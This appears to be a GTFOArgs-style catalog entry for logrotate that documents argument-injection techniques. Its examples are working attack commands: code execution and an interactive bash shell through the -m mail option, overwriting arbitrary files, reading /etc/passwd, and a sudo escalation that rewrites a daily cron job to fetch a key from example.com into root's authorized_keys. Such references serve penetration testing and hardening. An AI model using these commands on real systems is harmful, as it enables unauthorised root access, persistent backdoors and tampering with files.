---
trust_level: community
id: argument-injection-logrotate
namespace: argument:injection:logrotate
name: logrotate
description: "Argument injection via logrotate"
version: "1.0.0"
capabilities:
  - security.execution.command
  - system.file.write
  - system.file.read
  - security.privilege-escalation.sudo
platforms:
  - cross-platform
techniques:
  - execution
  - exfiltration
  - discovery
  - privilege-escalation
execution:
  template: "logrotate"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Requires a logrotate policy which uses the `mail` directive. A hash should be used as the final character in the command, as it is run with a few arguments."
    command: "logrotate -m \"/usr/bin/id &> /tmp/output #\" -v -f logrotate.policy
"
  - description: "Requires a logrotate policy which uses the `mail` directive."
    command: "logrotate -m \"/usr/bin/bash -i #\" -v -f logrotate.policy
"
  - description: "Creates or overwrites the file with the exact text `logrotate state -- version 2`"
    command: "logrotate -s /tmp/file logrotate.policy
"
  - description: "Creates or overwrites the file with junk data in combination with arbitrary data."
    command: "logrotate -l /tmp/file helloworld
"
  - description: "Reads the first 'word'."
    command: "logrotate /etc/passwd
"
  - description: "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. Note that this will overwrite `/etc/cron.daily/man-db` with a cronjob."
    command: "sudo logrotate -l /etc/cron.daily/man-db '2>/dev/null;wget https://example.com/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'"
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/logrotate/"
---

# logrotate

GTFOArgs entry for logrotate. This binary can be used to inject arguments for execution, file operations, or other capabilities.
